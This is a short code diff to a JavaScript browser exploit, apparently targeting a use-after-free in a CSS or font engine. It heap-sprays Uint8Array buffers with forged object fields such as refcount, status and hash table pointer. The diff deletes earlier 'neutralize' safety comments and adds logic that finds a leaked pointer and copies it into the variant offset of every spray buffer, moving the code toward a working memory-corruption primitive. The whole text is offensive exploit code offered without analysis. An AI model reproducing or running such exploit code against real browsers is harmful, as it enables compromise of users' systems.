@@ -27,15 +27,22 @@ try{
     window.__sp=[];
     for(var k=0;k<K;k++){
       var w=new Uint8Array(new ArrayBuffer(SIZE));
-      // NEUTRALIZE: set safe values so CSS engine doesn't crash
-      w[0]=2;w[1]=0;w[2]=0;w[3]=0; // refcount=2
+      w[0]=2;w[1]=0;w[2]=0;w[3]=0;
       var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
-      // +0x08..+0x17: variant data — leave as zero (null Ref = CSS returns empty)
-      // +0x82: status=0 (Pending — font engine won't try to use it)
       w[0x82]=0;
-      // +0x58..+0x5F: m_clients hash table = null (safe for iteration)
-      // Already zero — safe
       window.__sp.push(w);
+    }
+    // CRITICAL: find hit buffer and copy L1 to variant offset (+0x08)
+    // This makes the variant point to valid memory (hash table) instead of null
+    for(var i=0;i<window.__sp.length;i++){
+      var v=0;for(var j=0;j<8;j++)v+=window.__sp[i][0x58+j];
+      if(v>0){
+        // Copy L1 from +0x58 to +0x08 on ALL spray buffers
+        for(var b=0;b<window.__sp.length;b++){
+          for(var j=0;j<8;j++) window.__sp[b][0x08+j]=window.__sp[i][0x58+j];
+        }
+        break;
+      }
     }
     return undefined;
   },set:function(){}});
